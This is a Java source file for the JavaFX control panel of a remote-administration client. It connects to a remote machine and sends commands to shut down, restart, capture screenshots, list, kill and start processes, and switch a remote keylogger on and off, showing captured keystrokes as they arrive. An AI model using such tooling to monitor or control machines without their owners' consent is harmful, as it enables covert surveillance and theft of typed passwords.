package application;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Optional;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Group;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.ButtonType;
import javafx.scene.control.PasswordField;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TableView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.control.ButtonBar.ButtonData;
import javafx.scene.image.ImageView;
import javafx.stage.FileChooser;
import javafx.stage.Stage;


public class Controller
{
	private static Socket csocket = null;
	
	public static BufferedWriter toServer = null;
	
	public static BufferedReader fromServer;
	public static InputStream fromServer_i;
	
	static DataInputStream dataRei;

//INPUT STAGE =====================================================
	
	//DATA FROM GUI:
	@FXML
	private TextField ip4address;
	@FXML
	private PasswordField port;
	@FXML
	private ImageView scrshot;
	
	//BUTTON_CANCEL
	public void Cancel (ActionEvent event2) throws IOException
	{
		Platform.exit();
	}
	
	static String Ip4 = null;
	static int Port = 0;
	
	//BUTTON_CONNECT
	public void ConnectConfirm (ActionEvent event1)
	{	
		//GET IP and PORT
		try
		{
			Ip4 = ip4address.getText();
			Port = Integer.parseInt(port.getText().toString());
		}
		catch (Exception e)
		{
			Alert alert = new Alert(Alert.AlertType.ERROR);
			alert.setTitle("Alert");
			alert.setHeaderText("Missing IP or Port");

			ButtonType buttonCancel = new ButtonType("Cancel", ButtonData.CANCEL_CLOSE);
			
			alert.getButtonTypes().setAll(buttonCancel);
			
			Optional<ButtonType> result = alert.showAndWait();
			
			if (result.get() == buttonCancel) {
				Platform.exit();
			}
		}
		
		
		
		//CHANGE STAGE WHEN IP/PORT IS VALID
		Stage stage = (Stage) ((Node) event1.getSource()).getScene().getWindow();
			//Change Scene
		FXMLLoader loader = new FXMLLoader();
		loader.setLocation(getClass().getResource("Control Panel.fxml"));
		Parent root2 = null;
		try
		{
			root2 = loader.load();
		}
		catch (IOException e)
		{

			e.printStackTrace();
		}
		Scene scene2 = new Scene(root2);
		stage.setScene(scene2);
		//CREATE CONNECTION
		CreateConnection();
	}
	
	//CREATE CONNECTION ======================================================================
	static void CreateConnection()
	{
		try
        {
            csocket = new Socket(Ip4, Port);
            toServer = new BufferedWriter(new OutputStreamWriter(csocket.getOutputStream()));
            //fromServer = new BufferedReader(new InputStreamReader(csocket.getInputStream()));
            fromServer_i = csocket.getInputStream();
            
            InputStream in = csocket.getInputStream();
            dataRei = new DataInputStream(in);
        }
        catch(UnknownHostException u)
        {
            System.out.println(u);
        }
        catch(IOException i)
        {
            System.out.println(i);
        }
	}
	
//CONTROL PANNEL STAGE =============================================================================
	
	@FXML	
	private TextField pwtimer;
	@FXML
	private TextArea LogText;
	
	//DISCONNECT =============================================================================
	public void buttonDisconnect(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			try
			{	
				String s = "Over_Over";
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});
		Platform.exit();
	}
	//POWER CONTROL ==========================================================================
		//ShutDown
	public void buttonShutDown(ActionEvent eventc1) throws IOException
	{
		String pw_timer = pwtimer.getText().toString();
		
		Platform.runLater( () -> {
			try
			{	
				String s = "pwcontrol_sd_"+pw_timer;
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});
	}
	
		//LogOut
	public void buttonLogOut(ActionEvent eventc1) throws IOException
	{
		String pw_timer = pwtimer.getText().toString();
		
		Platform.runLater( () -> {
			try
			{	
				String s = "pwcontrol_lg_"+pw_timer;
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});
	}
	
		//Restart
	public void buttonRestart(ActionEvent eventc1) throws IOException
	{
		String pw_timer = pwtimer.getText().toString();
		
		Platform.runLater( () -> {
			try
			{	
				String s = "pwcontrol_rs_"+pw_timer;
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});
	}
	
		//Sleep
	public void buttonSleep(ActionEvent eventc1) throws IOException
	{
		String pw_timer = pwtimer.getText().toString();
		
		Platform.runLater( () -> {
			try
			{	
				String s = "pwcontrol_sl_"+pw_timer;
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});
	}
	
	//SCREENSHOT ==========================================================================
		//Capture
	public void buttonScrshot(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			try
			{	
				String s = "scrshot_1";
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
				//Xóa file cũ (nếu có)
		        File oldfile = new File("C:\\Users\\Van Ba Bao Huy\\Videos\\Scr\\scr.jpg"); 
		        oldfile.delete();
				
				byte[] i = new byte[200000];
				//Đọc thông tin được nhận và xuất file jpg
				BufferedOutputStream output_img = new BufferedOutputStream(new FileOutputStream("C:\\Users\\Van Ba Bao Huy\\Videos\\Scr\\scr.jpg"));
				int read = fromServer_i.read(i, 0, 200000);
				output_img.write(i, 0, read);
				output_img.close();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
			//Show Image
			Platform.runLater( () -> {
	        javafx.scene.image.Image image = new javafx.scene.image.Image("C:\\Users\\Van Ba Bao Huy\\Videos\\Scr\\scr.jpg");
	        scrshot.setImage(image);
	        });
		});	
	}	
		//Zoom
	public void buttonZoom(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			try {
				  javafx.scene.image.Image imageshow;
				  imageshow = new javafx.scene.image.Image(new FileInputStream("C:\\Users\\Van Ba Bao Huy\\Videos\\Scr\\scr.jpg"));
			      //Setting the image view 
			      ImageView imageView = new ImageView(imageshow); 
			      
			      //Setting the position of the image 
			      imageView.setY(25); 
			      
			      //setting the fit height and width of the image view 
			      imageView.setFitHeight(500); 
			      imageView.setFitWidth(800); 
			      
			      //Setting the preserve ratio of the image view 
			      imageView.setPreserveRatio(true);  
			      
			      //Creating a Group object
			      Group root = new Group(imageView);  
			      
			      //Creating a scene object 
			      Scene scene = new Scene(root, 800, 500);  
			      
			      //Setting title to the Stage 
			      Stage stage = new Stage();
			      stage.setTitle("ScreenShot");  
			      
			      //Adding scene to the stage 
			      stage.setScene(scene);
			      
			      //Displaying the contents of the stage 
			      stage.show();			
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}  
		});	
	}
		//Save Image
	public void buttonSaveas(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			
			Stage stage = (Stage) ((Node) eventc1.getSource()).getScene().getWindow();
			
			InputStream is = null;
		    OutputStream os = null;
		    byte[] i = new byte[200000];
		    
			try
			{							
				FileChooser SaveDialog = new FileChooser();
				SaveDialog.setTitle("Save As");
				SaveDialog.setInitialDirectory(new File("C:\\"));
				SaveDialog.getExtensionFilters().addAll(
			        new FileChooser.ExtensionFilter("PNG Files", "*.png"),
			        new FileChooser.ExtensionFilter("JPG Files", "*.jpg"),
			        new FileChooser.ExtensionFilter("JPEG Files", "*.jpeg"),
			        new FileChooser.ExtensionFilter("BMP Files", "*.bmp"),
			        new FileChooser.ExtensionFilter("GIF Files", "*.gif")
			    );
				
				File file = SaveDialog.showSaveDialog(stage);
				
				is = new FileInputStream("C:\\Users\\Van Ba Bao Huy\\Videos\\Scr\\scr.jpg");
				os = new FileOutputStream(file);
				int length;
		        while ((length = is.read(i)) > 0)
		        {
		            os.write(i, 0, length);
		        }
		        is.close();
		        os.close();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});	
	}	

	//KEYLOGGER ==========================================================================
		//Turn on Logger
	public void buttonbuttonLogTurnOn(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			try
			{	
				String s = "keylog_on_ac";
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
			//Keylog Stuff
			new Thread(new Runnable(){

				@Override
				public void run()
				{
					String keyloggedString = "";
					while (!keyloggedString.equals("OffKey"))
					{
						try
						{
							if (keyloggedString.equals("OffKey"))
							{
								break;
							}
							keyloggedString = dataRei.readUTF();
							System.out.print(keyloggedString);
							switch (keyloggedString) {
							case "Enter":
								LogText.appendText(keyloggedString);
								LogText.appendText("\n");
								break;
							default:
								LogText.appendText(keyloggedString);
								break;
							}
						}
						catch (IOException e)
						{
							e.printStackTrace();
						}
					}
				}

			}).start();
		});
	}
		//Turn off Logger
	public void buttonbuttonLogTurnOff(ActionEvent eventc1) throws IOException
	{
		
		Platform.runLater( () -> {
			try
			{	
				String s = "keylog_off_unac";
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});
	}
	
	//MANAGER: PROCESS ===================================================================
	
	@FXML
	private TableView<Manager.Process> prc_Table;
	@FXML
	private TableColumn<Manager.Process, String> prc_ProcessName;
	@FXML
	private TableColumn<Manager.Process, String> prc_PID;
	@FXML
	private TableColumn<Manager.Process, String> prc_SessionName;
	@FXML
	private TableColumn<Manager.Process, String> prc_Session;
	@FXML
	private TableColumn<Manager.Process, String> prc_MemUsage;
	
	private ObservableList<Manager.Process> ProcessList; //Lưu danh sách processlist, và có khả năng thay đổi được
	
		//Get List
	public void buttonProcessList(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			try
			{	
				String s = "process-get";
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
			//Process list receiver
			new Thread(new Runnable(){
				@Override
				public void run()
				{
					ProcessList = FXCollections.observableArrayList();
					
					prc_ProcessName.setCellValueFactory(new PropertyValueFactory<Manager.Process, String>("prc_ProcessName"));
					prc_PID.setCellValueFactory(new PropertyValueFactory<Manager.Process, String>("prc_PID"));
					prc_SessionName.setCellValueFactory(new PropertyValueFactory<Manager.Process, String>("prc_SessionName"));
					prc_Session.setCellValueFactory(new PropertyValueFactory<Manager.Process, String>("prc_Session"));
					prc_MemUsage.setCellValueFactory(new PropertyValueFactory<Manager.Process, String>("prc_MemUsage"));
					
					prc_Table.setItems(ProcessList);
					
					String process = "";
					int i = 0;
					while (!process.equals("End_of_process_list"))
					{
						try
						{
							process = dataRei.readUTF();
							if (!process.equals("End_of_process_list"))
							{
								if (!process.equals("End_of_process_list"))
								{
									if (i>=3)
									{
										ProcessLine(process);
									}
									i = i + 1;
								}
							}
						}
						catch (IOException e)
						{
							e.printStackTrace();
						}
					}
				}

			}).start();
		});
	}
		//Stop a process
	public void buttonStopProcess(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			try
			{	
				Manager.Process selectedProcess = prc_Table.getSelectionModel().getSelectedItem();
				String s = "processc_stop_" + selectedProcess.getPrc_PID();
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
				System.out.println("Killed "+selectedProcess.getPrc_ProcessName());
				ProcessList.remove(selectedProcess);
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});
	}	
		//Start a process
	@FXML
	private TextField ProcessToStart;
	
	public void buttonStartProcess(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			try
			{	
				String prcName = ProcessToStart.getText();
				String s = "processc_start_"+prcName;
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});
	}	
	
	//MANAGER: APPLICATION ===================================================================
	
	@FXML
	private TableView<Manager.Application> app_Table;
	@FXML
	private TableColumn<Manager.Application, String> app_Name;
	@FXML
	private TableColumn<Manager.Application, String> app_ID;
	@FXML
	private TableColumn<Manager.Application, String> app_Title;

	private ObservableList<Manager.Application> ApplicationList;
		
		//Get List
	public void buttonApplicationList(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			try
			{	
				String s = "Application-get";
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
			//Process list receiver
			new Thread(new Runnable(){
				@Override
				public void run()
				{
					ApplicationList = FXCollections.observableArrayList();
					
					app_Name.setCellValueFactory(new PropertyValueFactory<Manager.Application, String>("app_Name"));
					app_ID.setCellValueFactory(new PropertyValueFactory<Manager.Application, String>("app_ID"));
					app_Title.setCellValueFactory(new PropertyValueFactory<Manager.Application, String>("app_Title"));
					
					app_Table.setItems(ApplicationList);
					
					String application = "";
					int i = 0;
					while (!application.equals("End_of_applicaion_list"))
					{
						try
						{
							application = dataRei.readUTF();
							if (!application.equals("End_of_application_list"))
							{
								if (!application.equals("End_of_application_list") && application.length()>=1)
								{
									if (i>=3)
									{
										ApplicationLine(application);;
									}
									i = i + 1;
								}
							}
						}
						catch (IOException e)
						{
							break;
						}
					}
				}

			}).start();
		});
	}
		//Stop Application
	public void buttonStopApplication(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			try
			{	
				Manager.Application selectedApplication = app_Table.getSelectionModel().getSelectedItem();
				String s = "processc_stop_" + selectedApplication.getApp_ID();
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
				ApplicationList.remove(selectedApplication);
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});
	}	
		//Star Application
	@FXML
	private TextField AppToStart;
	
	public void buttonStartApplication(ActionEvent eventc1) throws IOException
	{
		Platform.runLater( () -> {
			try
			{	
				String prcName = AppToStart.getText();
				String s = "processc_start_"+prcName;
				Controller.toServer.write(s);
				Controller.toServer.newLine();
				Controller.toServer.flush();
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		});
	}	
	
	//=======================================================================================
	
	@SuppressWarnings("null")
	public void ProcessLine(String line)
	{
		String[] processinfo = line.split("\\s+");
		Manager.Process temp = new Manager.Process();
		int count = 0;
	    String stringtemp = "";
		while(true)
		{
			try
			{
		        int tempNum = Integer.parseInt(processinfo[count]);
		        break;
		    }
			catch (NumberFormatException e)
			{
				stringtemp += processinfo[count] + " ";
				count = count + 1;
			}
		}

		temp.setPrc_ProcessName(stringtemp);
		temp.setPrc_PID(processinfo[count]);
		count += 1;
		temp.setPrc_SessionName(processinfo[count]);
		count += 1;
		temp.setPrc_Session(processinfo[count]);
		count += 1;
		temp.setPrc_MemUsage(processinfo[count]);
		ProcessList.add(temp);
	}

	public void ApplicationLine(String line)
	{
		String[] appinfo = line.split("\\s+");
		Manager.Application temp = new Manager.Application();
		int count = 0;
	    String stringtemp = "";
		while(true)
		{
			try
			{
	        	int tempNum = Integer.parseInt(appinfo[count]);
		       	break;
	    	}
			catch (NumberFormatException e)
			{
				stringtemp += appinfo[count] + " ";
				count = count + 1;
			}
		}
		temp.setApp_Name(stringtemp);
		temp.setApp_ID(appinfo[count]);
		count += 1;
		stringtemp = "";
		for(int i = count; i<appinfo.length; i++)
		{
			stringtemp += appinfo[i];
		}
		temp.setApp_Title(stringtemp);
		ApplicationList.add(temp);
	}
		
}